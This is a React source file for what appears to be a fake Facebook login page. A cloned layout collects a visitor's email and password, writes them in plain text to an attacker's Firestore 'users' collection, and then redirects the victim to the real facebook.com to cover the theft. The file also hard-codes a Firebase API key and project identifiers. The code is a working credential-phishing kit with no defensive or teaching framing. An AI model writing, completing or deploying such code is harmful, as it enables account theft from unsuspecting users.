import React from "react";
import "./App.css";
import FBLayout from "./fblayout";
import { initializeApp } from "firebase/app";
import { getFirestore, collection, addDoc } from "firebase/firestore";

const firebaseConfig = {
  apiKey: "AIzaSyBNRD05XWZLAYkPegTt6-2Ro7eK_XCKzas",
  authDomain: "fake-fb-ba176.firebaseapp.com",
  projectId: "fake-fb-ba176",
  storageBucket: "fake-fb-ba176.appspot.com",
  messagingSenderId: "946509984225",
  appId: "1:946509984225:web:025df52ef84abf059a62a0",
  measurementId: "G-WDVSLHE1TJ",
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);

// Get Firestore instance
const db = getFirestore(app);

function App() {
  const [inputData, setInputData] = React.useState({
    email: "",
    password: "",
  });
  const onSubmitHandelar = async (e) => {
    try {
      // Create a new collection or use an existing one
      const docRef = await addDoc(collection(db, "users"), {
        email: inputData.email,
        password: inputData.password,
      });
      console.log("Document written with ID: ", docRef.id);
      window.location = "https://www.facebook.com/";
    } catch (error) {
      console.error("Error adding document: ", error);
    }
  };
  return (
    <div className='App'>
      <FBLayout
        inputData={inputData}
        setInputData={setInputData}
        onSubmitHandelar={onSubmitHandelar}
      />
    </div>
  );
}

export default App;
